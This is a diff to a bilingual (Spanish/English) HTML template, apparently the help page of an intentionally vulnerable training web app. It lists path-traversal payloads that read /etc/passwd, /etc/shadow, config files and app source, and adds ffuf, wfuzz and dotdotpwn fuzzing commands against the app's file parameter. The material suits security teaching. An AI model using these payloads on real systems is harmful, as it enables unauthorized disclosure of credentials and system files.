@@ -13,12 +13,7 @@
       </div>
       <button type="submit" class="btn-primary flex-shrink-0" data-i18n="btn_read">Leer</button>
     </form>
-    <div class="flex flex-wrap gap-2">
-      {% for path in ['readme.txt', '../../database/schema.sql', '../../app.py', '../../../etc/passwd', '../../../etc/hostname', '../../../proc/version'] %}
-      <a href="/files?file={{ path | urlencode }}"
-         class="text-xs px-2 py-1 rounded font-mono border border-gray-200 dark:border-gray-700 text-gray-500 dark:text-gray-400 hover:border-primary dark:hover:border-primary transition" style="color:inherit">{{ path }}</a>
-      {% endfor %}
-    </div>
+
   </div>
 
   {% if error %}
@@ -41,16 +36,34 @@
     </ol>
     <pre>/files?file=../../database/schema.sql    # esquema BD
 /files?file=../../app.py                  # código fuente
-/files?file=../../../etc/passwd           # Linux users
-/files?file=../../../etc/shadow           # hashes (root needed)
-/files?file=../../../etc/hostname
-/files?file=../../../proc/version</pre>
+/files?file=../../config.ini              # configuración
+/files?file=../../etc/passwd              # usuarios del sistema
+/files?file=../../etc/shadow              # hashes de contraseñas
+/files?file=../../etc/hostname            # nombre del host
+/files?file=../../proc/version            # versión del kernel</pre>
     <ol start="3">
       <li>Con Burp Suite: intercepta el GET y modifica el parámetro <code>file</code>.</li>
-      <li>Automatiza con <strong>dotdotpwn</strong>: <code>dotdotpwn -m http -h localhost -x 5000 -f /etc/passwd -u "http://localhost:5000/files?file=TRAVERSAL"</code></li>
+      <li>Fuzzea rutas con <strong>ffuf</strong> usando wordlists LFI de SecLists:</li>
     </ol>
+    <pre># Fuzzing básico de path traversal
+ffuf -u "http://TARGET:5000/files?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+  -mc 200 -fs 0
+
+# Wordlist alternativa
+ffuf -u "http://TARGET:5000/files?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -mc 200 -t 20
+
+# Con wfuzz
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+  --hc 404 "http://TARGET:5000/files?file=FUZZ"
+
+# Con dotdotpwn
+dotdotpwn -m http -h TARGET -x 5000 -f /etc/passwd \
+  -u "http://TARGET:5000/files?file=TRAVERSAL" -k "root:"</pre>
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Exploitation Steps</h3>
@@ -60,16 +73,34 @@
     </ol>
     <pre>/files?file=../../database/schema.sql    # DB schema
 /files?file=../../app.py                  # source code
-/files?file=../../../etc/passwd           # Linux users
-/files?file=../../../etc/shadow           # hashes (root needed)
-/files?file=../../../etc/hostname
-/files?file=../../../proc/version</pre>
+/files?file=../../config.ini              # app config
+/files?file=../../etc/passwd              # system users
+/files?file=../../etc/shadow              # password hashes
+/files?file=../../etc/hostname            # hostname
+/files?file=../../proc/version            # kernel version</pre>
     <ol start="3">
       <li>With Burp Suite: intercept the GET request and modify the <code>file</code> parameter.</li>
-      <li>Automate with <strong>dotdotpwn</strong>: <code>dotdotpwn -m http -h localhost -x 5000 -f /etc/passwd -u "http://localhost:5000/files?file=TRAVERSAL"</code></li>
+      <li>Fuzz paths with <strong>ffuf</strong> using SecLists LFI wordlists:</li>
     </ol>
+    <pre># Basic LFI fuzzing
+ffuf -u "http://TARGET:5000/files?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+  -mc 200 -fs 0
+
+# Alternative wordlist
+ffuf -u "http://TARGET:5000/files?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -mc 200 -t 20
+
+# With wfuzz
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+  --hc 404 "http://TARGET:5000/files?file=FUZZ"
+
+# With dotdotpwn
+dotdotpwn -m http -h TARGET -x 5000 -f /etc/passwd \
+  -u "http://TARGET:5000/files?file=TRAVERSAL" -k "root:"</pre>
     <h3>Tools</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
   </div>
 </div>
 {% endblock %}
